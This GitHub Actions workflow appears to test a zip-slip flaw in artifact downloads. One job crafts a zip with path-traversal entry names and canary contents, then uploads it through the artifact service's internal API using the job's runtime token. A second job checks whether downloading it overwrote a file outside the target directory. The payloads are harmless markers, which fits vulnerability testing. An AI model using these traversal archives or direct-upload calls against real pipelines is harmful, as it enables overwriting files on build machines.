name: artifact-zipslip2
on: workflow_dispatch
jobs:
  produce:
    runs-on: ubuntu-latest
    steps:
      - name: zip with DEEPER embedded traversal + overwrite targets
        run: |
          python3 - <<'EOF'
          import zipfile
          z=zipfile.ZipFile('/tmp/h2.zip','w',zipfile.ZIP_DEFLATED)
          z.writestr('normal.txt','DEPTH_NORMAL_77aa\n')
          z.writestr('a/../../depth1.txt','DEPTH1_77aa\n')
          z.writestr('a/../../../depth2.txt','DEPTH2_77aa\n')
          z.writestr('a/../../../../depth3.txt','DEPTH3_77aa\n')
          z.writestr('a/../../../../../../tmp/depth_tmp.txt','DEPTH_TMP_77aa\n')
          z.writestr('a/../../OVERWRITE_ME.txt','OVERWRITTEN_BY_ARTIFACT_77aa\n')
          z.close()
          EOF
          ls -l /tmp/h2.zip
      - uses: actions/github-script@v7
        with:
          script: |
            const fs=require('fs'), crypto=require('crypto');
            const tok=process.env.ACTIONS_RUNTIME_TOKEN, base=process.env.ACTIONS_RESULTS_URL;
            const claims=JSON.parse(Buffer.from(tok.split('.')[1],'base64').toString());
            const m=(claims.scp||"").match(/Actions\.Results:([0-9a-f-]+):([0-9a-f-]+)/i);
            const ids={workflow_run_backend_id:m[1], workflow_job_run_backend_id:m[2]};
            let r=await fetch(base+"twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact",
              {method:"POST",headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
               body:JSON.stringify({...ids,name:"zipslip2",version:4})});
            const c=await r.json();
            const data=fs.readFileSync('/tmp/h2.zip');
            const blk=Buffer.from("blk1").toString('base64');
            core.info("PUT="+(await fetch(c.signed_upload_url+"&comp=block&blockid="+blk,
              {method:"PUT",headers:{"x-ms-blob-type":"BlockBlob"},body:data})).status);
            core.info("COMMIT="+(await fetch(c.signed_upload_url+"&comp=blocklist",{method:"PUT",
              headers:{"Content-Type":"application/xml"},
              body:'<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>'+blk+'</Latest></BlockList>'})).status);
            const sha=crypto.createHash('sha256').update(data).digest('hex');
            const f=await fetch(base+"twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact",
              {method:"POST",headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
               body:JSON.stringify({...ids,name:"zipslip2",size:data.length,hash:"sha256:"+sha})});
            core.info("FINALIZE="+f.status+" "+(await f.text()).slice(0,90));
  consume:
    needs: produce
    runs-on: ubuntu-latest
    steps:
      - name: pre-place a file the artifact will try to overwrite
        run: |
          mkdir -p /home/runner/work/tgt/dl
          echo "ORIGINAL_CONTENT_PRESERVED" > /home/runner/work/tgt/OVERWRITE_ME.txt
          echo "--- before ---"; cat /home/runner/work/tgt/OVERWRITE_ME.txt
      - uses: actions/download-artifact@v4
        continue-on-error: true
        with:
          name: zipslip2
          path: /home/runner/work/tgt/dl
      - name: results
        run: |
          echo "--- OVERWRITE target now ---"
          cat /home/runner/work/tgt/OVERWRITE_ME.txt || echo "(missing)"
          echo "--- where did DEPTH canaries land ---"
          grep -rl DEPTH /home/runner /tmp 2>/dev/null | grep -v _diag | grep -v '_temp/' | sed 's|^|  HIT |'
